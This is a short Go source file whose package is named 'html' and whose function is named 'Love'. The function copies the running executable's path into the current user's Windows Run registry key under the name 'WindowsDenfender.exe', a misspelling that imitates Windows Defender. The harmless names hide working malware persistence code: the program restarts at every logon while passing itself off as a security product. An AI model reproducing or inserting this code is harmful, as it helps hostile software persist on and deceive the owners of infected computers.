package html

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"os"

)

const registryKey = `Software\Microsoft\Windows\CurrentVersion\Run`

func Love() {
	programName := "WindowsDenfender.exe"
	filePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting executable path:", err)
		return
	}

	err = addStartupEntry(programName, filePath)
	if err != nil {
		fmt.Println("Error adding startup entry:", err)
		return
	}

	fmt.Println("Your Golang application has been added to startup.")
}

func addStartupEntry(entryName, executablePath string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey, registry.ALL_ACCESS)
	if err != nil {
		fmt.Println("Error opening registry key:", err)
		return err
	}
	defer k.Close()

	err = k.SetStringValue(entryName, executablePath)
	if err != nil {
		fmt.Println("Error setting registry value:", err)
		return err
	}

	return nil
}
